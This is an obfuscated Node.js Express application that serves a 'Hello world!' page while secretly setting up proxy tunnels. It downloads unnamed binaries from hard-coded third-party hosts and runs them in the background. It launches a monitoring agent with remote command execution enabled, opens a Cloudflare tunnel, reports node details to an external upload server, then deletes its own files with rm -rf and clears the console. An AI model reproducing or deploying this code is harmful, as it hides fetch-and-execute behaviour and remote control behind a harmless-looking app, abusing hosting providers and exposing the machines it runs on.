const _0x39711f=_0x1722;(function(_0x2a0615,_0x542bd2){const _0x39b663=_0x1722,_0x19c08f=_0x2a0615();while(!![]){try{const _0x31ae51=-parseInt(_0x39b663(0xcb))/0x1+parseInt(_0x39b663(0x11c))/0x2*(parseInt(_0x39b663(0xa9))/0x3)+parseInt(_0x39b663(0xc3))/0x4+parseInt(_0x39b663(0x14d))/0x5*(-parseInt(_0x39b663(0x103))/0x6)+parseInt(_0x39b663(0xef))/0x7+parseInt(_0x39b663(0x106))/0x8+parseInt(_0x39b663(0xab))/0x9*(-parseInt(_0x39b663(0x113))/0xa);if(_0x31ae51===_0x542bd2)break;else _0x19c08f['push'](_0x19c08f['shift']());}catch(_0x5d8cf4){_0x19c08f['push'](_0x19c08f['shift']());}}}(_0x10c5,0xb57d8));const express=require('express'),app=express(),axios=require(_0x39711f(0x10a)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x39711f(0x13f)),exec=promisify(require(_0x39711f(0x10b))[_0x39711f(0xaf)]),{execSync}=require(_0x39711f(0x10b)),UPLOAD_URL=process[_0x39711f(0xe2)][_0x39711f(0xce)]||'',PROJECT_URL=process[_0x39711f(0xe2)][_0x39711f(0xf6)]||'',AUTO_ACCESS=process[_0x39711f(0xe2)]['AUTO_ACCESS']||![],FILE_PATH=process['env']['FILE_PATH']||'./tmp',SUB_PATH=process[_0x39711f(0xe2)][_0x39711f(0x127)]||_0x39711f(0xf2),PORT=process['env']['SERVER_PORT']||process['env'][_0x39711f(0xe4)]||0xbb8,UUID=process[_0x39711f(0xe2)][_0x39711f(0xf3)]||_0x39711f(0x136),NEZHA_SERVER=process[_0x39711f(0xe2)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x39711f(0xe2)]['NEZHA_PORT']||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x39711f(0xe2)][_0x39711f(0xd8)]||'',ARGO_AUTH=process[_0x39711f(0xe2)]['ARGO_AUTH']||'',ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process[_0x39711f(0xe2)][_0x39711f(0x130)]||_0x39711f(0xfc),CFPORT=process[_0x39711f(0xe2)]['CFPORT']||0x1bb,NAME=process[_0x39711f(0xe2)]['NAME']||'';!fs[_0x39711f(0xda)](FILE_PATH)?(fs[_0x39711f(0x14e)](FILE_PATH),console[_0x39711f(0xee)](FILE_PATH+'\x20is\x20created')):console[_0x39711f(0xee)](FILE_PATH+_0x39711f(0x123));let npmPath=path[_0x39711f(0xb1)](FILE_PATH,_0x39711f(0xc8)),phpPath=path[_0x39711f(0xb1)](FILE_PATH,_0x39711f(0x100)),webPath=path[_0x39711f(0xb1)](FILE_PATH,_0x39711f(0xae)),botPath=path[_0x39711f(0xb1)](FILE_PATH,'bot'),subPath=path[_0x39711f(0xb1)](FILE_PATH,_0x39711f(0xd0)),listPath=path[_0x39711f(0xb1)](FILE_PATH,_0x39711f(0x112)),bootLogPath=path['join'](FILE_PATH,_0x39711f(0x132)),configPath=path[_0x39711f(0xb1)](FILE_PATH,_0x39711f(0x125));function deleteNodes(){const _0x26d536=_0x39711f;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x21faf1;try{_0x21faf1=fs[_0x26d536(0x131)](subPath,_0x26d536(0xb3));}catch{return null;}const _0x2a8f9f=Buffer['from'](_0x21faf1,_0x26d536(0xbd))[_0x26d536(0x129)]('utf-8'),_0x189c46=_0x2a8f9f['split']('\x0a')['filter'](_0x229206=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x26d536(0xbb)](_0x229206));if(_0x189c46[_0x26d536(0xe6)]===0x0)return;return axios[_0x26d536(0xf9)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x26d536(0xb9)]({'nodes':_0x189c46}),{'headers':{'Content-Type':_0x26d536(0x120)}})[_0x26d536(0xe7)](_0x9dfc4f=>{return null;});}catch(_0x2b244a){return null;}}function cleanupOldFiles(){const _0x520cc5=_0x39711f,_0x1df827=[_0x520cc5(0xae),_0x520cc5(0x144),'npm','php',_0x520cc5(0xd0),'boot.log'];_0x1df827[_0x520cc5(0x111)](_0x6811fa=>{const _0x411b35=path['join'](FILE_PATH,_0x6811fa);fs['unlink'](_0x411b35,()=>{});});}app[_0x39711f(0x146)]('/',function(_0x194c6b,_0x923fd5){const _0x1a505f=_0x39711f;_0x923fd5[_0x1a505f(0xdf)]('Hello\x20world!');});const config={'log':{'access':_0x39711f(0x116),'error':_0x39711f(0x116),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x39711f(0x117),'settings':{'clients':[{'id':UUID,'flow':_0x39711f(0xfa)}],'decryption':_0x39711f(0x101),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x39711f(0xc5),'dest':0xbbb},{'path':_0x39711f(0xa6),'dest':0xbbc}]},'streamSettings':{'network':_0x39711f(0x148)}},{'port':0xbb9,'listen':_0x39711f(0xb6),'protocol':_0x39711f(0x117),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x39711f(0x148),'security':_0x39711f(0x101)}},{'port':0xbba,'listen':_0x39711f(0xb6),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x39711f(0x101)},'streamSettings':{'network':'ws','security':_0x39711f(0x101),'wsSettings':{'path':_0x39711f(0xaa)}},'sniffing':{'enabled':!![],'destOverride':[_0x39711f(0xd7),_0x39711f(0xd4),_0x39711f(0xb4)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x39711f(0xc9),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x39711f(0xc5)}},'sniffing':{'enabled':!![],'destOverride':[_0x39711f(0xd7),_0x39711f(0xd4),_0x39711f(0xb4)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x39711f(0xb6),'protocol':_0x39711f(0x142),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x39711f(0xa6)}},'sniffing':{'enabled':!![],'destOverride':['http','tls','quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x39711f(0x14c)]},'outbounds':[{'protocol':_0x39711f(0x102),'tag':'direct'},{'protocol':_0x39711f(0x147),'tag':_0x39711f(0x10e)}]};fs[_0x39711f(0xfd)](path[_0x39711f(0xb1)](FILE_PATH,_0x39711f(0x125)),JSON[_0x39711f(0xb9)](config,null,0x2));function getSystemArchitecture(){const _0x4a90f1=_0x39711f,_0x4f9a62=os[_0x4a90f1(0xd6)]();return _0x4f9a62==='arm'||_0x4f9a62===_0x4a90f1(0xea)||_0x4f9a62===_0x4a90f1(0x126)?_0x4a90f1(0xbf):_0x4a90f1(0x13e);}function downloadFile(_0x2553c3,_0x387b72,_0x3124ea){const _0x3712a0=_0x39711f,_0x287200=path[_0x3712a0(0xb1)](FILE_PATH,_0x2553c3),_0xd0489c=fs[_0x3712a0(0x12e)](_0x287200);axios({'method':_0x3712a0(0x146),'url':_0x387b72,'responseType':'stream'})[_0x3712a0(0x10d)](_0x410864=>{const _0x4144fb=_0x3712a0;_0x410864[_0x4144fb(0x134)][_0x4144fb(0x12c)](_0xd0489c),_0xd0489c['on'](_0x4144fb(0xfb),()=>{const _0x43cb23=_0x4144fb;_0xd0489c[_0x43cb23(0xf0)](),console['log'](_0x43cb23(0xfe)+_0x2553c3+'\x20successfully'),_0x3124ea(null,_0x2553c3);}),_0xd0489c['on'](_0x4144fb(0xc0),_0x1c7034=>{const _0x476d2f=_0x4144fb;fs['unlink'](_0x287200,()=>{});const _0x2330ad=_0x476d2f(0xfe)+_0x2553c3+_0x476d2f(0x109)+_0x1c7034[_0x476d2f(0x135)];console[_0x476d2f(0xc0)](_0x2330ad),_0x3124ea(_0x2330ad);});})[_0x3712a0(0xe7)](_0x341731=>{const _0x67b19f=_0x3712a0,_0x10ca45=_0x67b19f(0xfe)+_0x2553c3+_0x67b19f(0x109)+_0x341731[_0x67b19f(0x135)];console[_0x67b19f(0xc0)](_0x10ca45),_0x3124ea(_0x10ca45);});}async function downloadFilesAndRun(){const _0x4476ae=_0x39711f,_0x329aa6=getSystemArchitecture(),_0x4adee5=getFilesForArchitecture(_0x329aa6);if(_0x4adee5['length']===0x0){console[_0x4476ae(0xee)](_0x4476ae(0xf1));return;}const _0x3b628a=_0x4adee5['map'](_0xc90ee1=>{return new Promise((_0x202276,_0x5b81d4)=>{const _0xf7394c=_0x1722;downloadFile(_0xc90ee1['fileName'],_0xc90ee1[_0xf7394c(0x11e)],(_0x26da64,_0x2ba5c9)=>{_0x26da64?_0x5b81d4(_0x26da64):_0x202276(_0x2ba5c9);});});});try{await Promise['all'](_0x3b628a);}catch(_0x3e4c15){console[_0x4476ae(0xc0)](_0x4476ae(0xd1),_0x3e4c15);return;}function _0x3b5042(_0x2761ae){const _0x17e44d=_0x4476ae,_0x69f066=0x1fd;_0x2761ae[_0x17e44d(0x111)](_0x21049e=>{const _0x1e0ff0=_0x17e44d,_0x25ffdf=path[_0x1e0ff0(0xb1)](FILE_PATH,_0x21049e);fs['existsSync'](_0x25ffdf)&&fs[_0x1e0ff0(0x121)](_0x25ffdf,_0x69f066,_0x3d134d=>{const _0x278b4b=_0x1e0ff0;_0x3d134d?console[_0x278b4b(0xc0)](_0x278b4b(0xd9)+_0x25ffdf+':\x20'+_0x3d134d):console['log'](_0x278b4b(0x119)+_0x25ffdf+':\x20'+_0x69f066['toString'](0x8));});});}const _0x29c2c5=NEZHA_PORT?[_0x4476ae(0x124),_0x4476ae(0xb0),_0x4476ae(0xde)]:[_0x4476ae(0xe8),'./web',_0x4476ae(0xde)];_0x3b5042(_0x29c2c5);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x449361=NEZHA_SERVER[_0x4476ae(0x108)](':')?NEZHA_SERVER[_0x4476ae(0xbe)](':')[_0x4476ae(0x118)]():'',_0x4bda46=new Set(['443',_0x4476ae(0x145),_0x4476ae(0xa8),_0x4476ae(0x10f),_0x4476ae(0x14b),_0x4476ae(0x107)]),_0x3cd0fa=_0x4bda46[_0x4476ae(0xe3)](_0x449361)?_0x4476ae(0xec):_0x4476ae(0xbc),_0x4a5a24='\x0aclient_secret:\x20'+NEZHA_KEY+_0x4476ae(0x133)+NEZHA_SERVER+_0x4476ae(0xe5)+_0x3cd0fa+_0x4476ae(0xdd)+UUID;fs[_0x4476ae(0xfd)](path[_0x4476ae(0xb1)](FILE_PATH,_0x4476ae(0xad)),_0x4a5a24);const _0x47f661=_0x4476ae(0xcf)+FILE_PATH+_0x4476ae(0xf5)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x47f661),console['log']('php\x20is\x20running'),await new Promise(_0x39cd1e=>setTimeout(_0x39cd1e,0x3e8));}catch(_0x294abc){console['error'](_0x4476ae(0x12a)+_0x294abc);}}else{let _0x421855='';const _0x397892=['443',_0x4476ae(0x145),_0x4476ae(0xa8),_0x4476ae(0x10f),_0x4476ae(0x14b),_0x4476ae(0x107)];_0x397892[_0x4476ae(0x108)](NEZHA_PORT)&&(_0x421855=_0x4476ae(0x12b));const _0x239d1d=_0x4476ae(0xcf)+FILE_PATH+_0x4476ae(0xff)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4476ae(0x12f)+NEZHA_KEY+'\x20'+_0x421855+_0x4476ae(0x141);try{await exec(_0x239d1d),console[_0x4476ae(0xee)](_0x4476ae(0x13d)),await new Promise(_0x2a7163=>setTimeout(_0x2a7163,0x3e8));}catch(_0x3b358d){console[_0x4476ae(0xc0)]('npm\x20running\x20error:\x20'+_0x3b358d);}}}else console[_0x4476ae(0xee)](_0x4476ae(0xc6));const _0xee866d=_0x4476ae(0xcf)+FILE_PATH+_0x4476ae(0x150)+FILE_PATH+_0x4476ae(0x128);try{await exec(_0xee866d),console[_0x4476ae(0xee)](_0x4476ae(0x114)),await new Promise(_0x5d0fb3=>setTimeout(_0x5d0fb3,0x3e8));}catch(_0x166dfa){console['error'](_0x4476ae(0xb8)+_0x166dfa);}if(fs[_0x4476ae(0xda)](path[_0x4476ae(0xb1)](FILE_PATH,'bot'))){let _0x29d6ec;if(ARGO_AUTH[_0x4476ae(0xc1)](/^[A-Z0-9a-z=]{120,250}$/))_0x29d6ec='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x4476ae(0xc1)](/TunnelSecret/)?_0x29d6ec='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+'/tunnel.yml\x20run':_0x29d6ec=_0x4476ae(0x143)+FILE_PATH+_0x4476ae(0xdc)+ARGO_PORT;try{await exec(_0x4476ae(0xcf)+FILE_PATH+'/bot\x20'+_0x29d6ec+_0x4476ae(0xf4)),console[_0x4476ae(0xee)](_0x4476ae(0x104)),await new Promise(_0x4f57d7=>setTimeout(_0x4f57d7,0x7d0));}catch(_0x26910b){console['error']('Error\x20executing\x20command:\x20'+_0x26910b);}}await new Promise(_0x293b71=>setTimeout(_0x293b71,0x1388));}function getFilesForArchitecture(_0x338adf){const _0x3fddff=_0x39711f;let _0x4fa6ae;_0x338adf===_0x3fddff(0xbf)?_0x4fa6ae=[{'fileName':_0x3fddff(0xae),'fileUrl':_0x3fddff(0x151)},{'fileName':_0x3fddff(0x144),'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x4fa6ae=[{'fileName':'web','fileUrl':_0x3fddff(0x14a)},{'fileName':'bot','fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x556ca9=_0x338adf===_0x3fddff(0xbf)?_0x3fddff(0xe0):_0x3fddff(0x13a);_0x4fa6ae[_0x3fddff(0xe1)]({'fileName':_0x3fddff(0xc8),'fileUrl':_0x556ca9});}else{const _0x3ae8c8=_0x338adf==='arm'?'https://arm64.ssss.nyc.mn/v1':_0x3fddff(0x11a);_0x4fa6ae['unshift']({'fileName':_0x3fddff(0x100),'fileUrl':_0x3ae8c8});}}return _0x4fa6ae;}function argoType(){const _0x419d21=_0x39711f;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x419d21(0xee)](_0x419d21(0xa7));return;}if(ARGO_AUTH['includes'](_0x419d21(0xeb))){fs[_0x419d21(0xfd)](path[_0x419d21(0xb1)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x427e42=_0x419d21(0x11d)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x419d21(0xb1)](FILE_PATH,_0x419d21(0xb5))+_0x419d21(0xc2)+ARGO_DOMAIN+_0x419d21(0x11b)+ARGO_PORT+_0x419d21(0x13c);fs['writeFileSync'](path[_0x419d21(0xb1)](FILE_PATH,'tunnel.yml'),_0x427e42);}else console[_0x419d21(0xee)](_0x419d21(0x14f));}argoType();function _0x1722(_0x23d637,_0x3311b2){const _0x10c542=_0x10c5();return _0x1722=function(_0x1722cb,_0xc99689){_0x1722cb=_0x1722cb-0xa6;let _0x11992a=_0x10c542[_0x1722cb];return _0x11992a;},_0x1722(_0x23d637,_0x3311b2);}async function extractDomains(){const _0x277cce=_0x39711f;let _0x2c1ee7;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2c1ee7=ARGO_DOMAIN,console[_0x277cce(0xee)]('ARGO_DOMAIN:',_0x2c1ee7),await _0x16ef59(_0x2c1ee7);else try{const _0x24157c=fs['readFileSync'](path[_0x277cce(0xb1)](FILE_PATH,_0x277cce(0x132)),'utf-8'),_0x2c1814=_0x24157c[_0x277cce(0xbe)]('\x0a'),_0x18b119=[];_0x2c1814['forEach'](_0x534ed8=>{const _0x37dddc=_0x277cce,_0x544459=_0x534ed8['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x544459){const _0x2263e0=_0x544459[0x1];_0x18b119[_0x37dddc(0x149)](_0x2263e0);}});if(_0x18b119[_0x277cce(0xe6)]>0x0)_0x2c1ee7=_0x18b119[0x0],console['log'](_0x277cce(0xba),_0x2c1ee7),await _0x16ef59(_0x2c1ee7);else{console[_0x277cce(0xee)](_0x277cce(0xc4)),fs[_0x277cce(0xb2)](path[_0x277cce(0xb1)](FILE_PATH,_0x277cce(0x132)));async function _0x3d6dc5(){const _0xdd3094=_0x277cce;try{await exec(_0xdd3094(0x115));}catch(_0x5c2e35){}}_0x3d6dc5(),await new Promise(_0x20b62f=>setTimeout(_0x20b62f,0xbb8));const _0x3ba409='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x277cce(0xcf)+path[_0x277cce(0xb1)](FILE_PATH,_0x277cce(0x144))+'\x20'+_0x3ba409+_0x277cce(0xf4)),console[_0x277cce(0xee)](_0x277cce(0xc7)),await new Promise(_0x749543=>setTimeout(_0x749543,0xbb8)),await extractDomains();}catch(_0x4cd90b){console[_0x277cce(0xc0)](_0x277cce(0xed)+_0x4cd90b);}}}catch(_0x4ac494){console[_0x277cce(0xc0)](_0x277cce(0x138),_0x4ac494);}async function _0x16ef59(_0x410be4){const _0x28bd82=_0x277cce,_0x153e1e=execSync(_0x28bd82(0x140),{'encoding':'utf-8'}),_0x53c6b3=_0x153e1e['trim'](),_0x2cd53f=NAME?NAME+'-'+_0x53c6b3:_0x53c6b3;return new Promise(_0x3d6948=>{setTimeout(()=>{const _0x452ce4=_0x1722,_0x319b10={'v':'2','ps':''+_0x2cd53f,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x452ce4(0x101),'net':'ws','type':'none','host':_0x410be4,'path':'/vmess-argo?ed=2560','tls':_0x452ce4(0xd4),'sni':_0x410be4,'alpn':'','fp':_0x452ce4(0x13b)},_0x18ae4d=_0x452ce4(0xf8)+UUID+'@'+CFIP+':'+CFPORT+_0x452ce4(0xd3)+_0x410be4+_0x452ce4(0xf7)+_0x410be4+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x2cd53f+'\x0a\x20\x20\x0avmess://'+Buffer[_0x452ce4(0xdb)](JSON[_0x452ce4(0xb9)](_0x319b10))[_0x452ce4(0x129)](_0x452ce4(0xbd))+_0x452ce4(0xb7)+UUID+'@'+CFIP+':'+CFPORT+_0x452ce4(0xd2)+_0x410be4+_0x452ce4(0xf7)+_0x410be4+_0x452ce4(0xca)+_0x2cd53f+'\x0a\x20\x20\x20\x20';console[_0x452ce4(0xee)](Buffer[_0x452ce4(0xdb)](_0x18ae4d)[_0x452ce4(0x129)]('base64')),fs[_0x452ce4(0xfd)](subPath,Buffer['from'](_0x18ae4d)[_0x452ce4(0x129)](_0x452ce4(0xbd))),console[_0x452ce4(0xee)](FILE_PATH+_0x452ce4(0x139)),uplodNodes(),app[_0x452ce4(0x146)]('/'+SUB_PATH,(_0x195c1a,_0x554b43)=>{const _0x146f4c=_0x452ce4,_0x357344=Buffer[_0x146f4c(0xdb)](_0x18ae4d)[_0x146f4c(0x129)]('base64');_0x554b43[_0x146f4c(0x10c)]('Content-Type',_0x146f4c(0x12d)),_0x554b43[_0x146f4c(0xdf)](_0x357344);}),_0x3d6948(_0x18ae4d);},0x7d0);});}}async function uplodNodes(){const _0x322fe=_0x39711f;if(UPLOAD_URL&&PROJECT_URL){const _0x50f1f7=PROJECT_URL+'/'+SUB_PATH,_0x257710={'subscription':[_0x50f1f7]};try{const _0x1807ea=await axios[_0x322fe(0xf9)](UPLOAD_URL+'/api/add-subscriptions',_0x257710,{'headers':{'Content-Type':_0x322fe(0x120)}});if(_0x1807ea[_0x322fe(0x11f)]===0xc8)console[_0x322fe(0xee)](_0x322fe(0x137));else return null;}catch(_0x1979c5){if(_0x1979c5[_0x322fe(0xd5)]){if(_0x1979c5[_0x322fe(0xd5)][_0x322fe(0x11f)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x56fc34=fs[_0x322fe(0x131)](listPath,_0x322fe(0xb3)),_0x41c332=_0x56fc34[_0x322fe(0xbe)]('\x0a')['filter'](_0x392c35=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x322fe(0xbb)](_0x392c35));if(_0x41c332[_0x322fe(0xe6)]===0x0)return;const _0x1b0af6=JSON['stringify']({'nodes':_0x41c332});try{await axios[_0x322fe(0xf9)](UPLOAD_URL+'/api/add-nodes',_0x1b0af6,{'headers':{'Content-Type':'application/json'}});if(response[_0x322fe(0x11f)]===0xc8)console[_0x322fe(0xee)](_0x322fe(0x137));else return null;}catch(_0x33080d){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4a0ac9=_0x1722,_0x577704=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x577704[_0x4a0ac9(0x149)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x577704['push'](phpPath);exec('rm\x20-rf\x20'+_0x577704[_0x4a0ac9(0xb1)]('\x20')+'\x20>/dev/null\x202>&1',_0xde047=>{const _0x18edc0=_0x4a0ac9;console[_0x18edc0(0xe9)](),console['log'](_0x18edc0(0x110)),console[_0x18edc0(0xee)](_0x18edc0(0xcc));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2171d0=_0x39711f;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2171d0(0xee)](_0x2171d0(0xcd));return;}try{const _0x5834eb=await axios['post'](_0x2171d0(0xac),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2171d0(0x120)}});console[_0x2171d0(0xee)](_0x2171d0(0x122));}catch(_0x4eb8e9){console[_0x2171d0(0xc0)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x4eb8e9[_0x2171d0(0x135)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x39711f(0x105)](PORT,()=>console[_0x39711f(0xee)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));function _0x10c5(){const _0x32dd29=['bot','8443','get','blackhole','tcp','push','https://amd64.ssss.nyc.mn/web','2083','https+local://8.8.8.8/dns-query','183860Dkplne','mkdirSync','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','/web\x20-c\x20','https://arm64.ssss.nyc.mn/web','/trojan-argo','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','2096','44334daVvgq','/vless-argo','144yJAoEZ','https://oooo.serv00.net/add-url','config.yaml','web','exec','./web','join','unlinkSync','utf-8','quic','tunnel.json','127.0.0.1','\x0a\x20\x20\x0atrojan://','web\x20running\x20error:\x20','stringify','ArgoDomain:','test','false','base64','split','arm','error','match','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','3026568zRRtXS','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','/vmess-argo','NEZHA\x20variable\x20is\x20empty,skip\x20running','bot\x20is\x20running.','npm','vmess','&path=%2Ftrojan-argo%3Fed%3D2560#','1275351AIVPnm','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','Skipping\x20adding\x20automatic\x20access\x20task','UPLOAD_URL','nohup\x20','sub.txt','Error\x20downloading\x20files:','?security=tls&sni=','?encryption=none&security=tls&sni=','tls','response','arch','http','ARGO_DOMAIN','Empowerment\x20failed\x20for\x20','existsSync','from','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','./bot','send','https://arm64.ssss.nyc.mn/agent','unshift','env','has','PORT','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','length','catch','./php','clear','arm64','TunnelSecret','true','Error\x20executing\x20command:\x20','log','2623383tvIIKn','close','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','sykin','UUID','\x20>/dev/null\x202>&1\x20&','/php\x20-c\x20\x22','PROJECT_URL','&fp=chrome&type=ws&host=','\x0avless://','post','xtls-rprx-vision','finish','cdns.doon.eu.org','writeFileSync','Download\x20','/npm\x20-s\x20','php','none','freedom','6kkfBax','bot\x20is\x20running','listen','10794672kXzZZX','2053','includes','\x20failed:\x20','axios','child_process','set','then','block','2087','App\x20is\x20running','forEach','list.txt','866130EOjGyA','web\x20is\x20running','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','/dev/null','vless','pop','Empowerment\x20success\x20for\x20','https://amd64.ssss.nyc.mn/v1','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','130RKwXQa','\x0a\x20\x20tunnel:\x20','fileUrl','status','application/json','chmod','automatic\x20access\x20task\x20added\x20successfully','\x20already\x20exists','./npm','config.json','aarch64','SUB_PATH','/config.json\x20>/dev/null\x202>&1\x20&','toString','php\x20running\x20error:\x20','--tls','pipe','text/plain;\x20charset=utf-8','createWriteStream','\x20-p\x20','CFIP','readFileSync','boot.log','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','data','message','9e831353-73fc-4e71-99a7-4799cc83a30b','Subscription\x20uploaded\x20successfully','Error\x20reading\x20boot.log:','/sub.txt\x20saved\x20successfully','https://amd64.ssss.nyc.mn/agent','chrome','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','npm\x20is\x20running','amd','util','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','trojan','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'];_0x10c5=function(){return _0x32dd29;};return _0x10c5();}
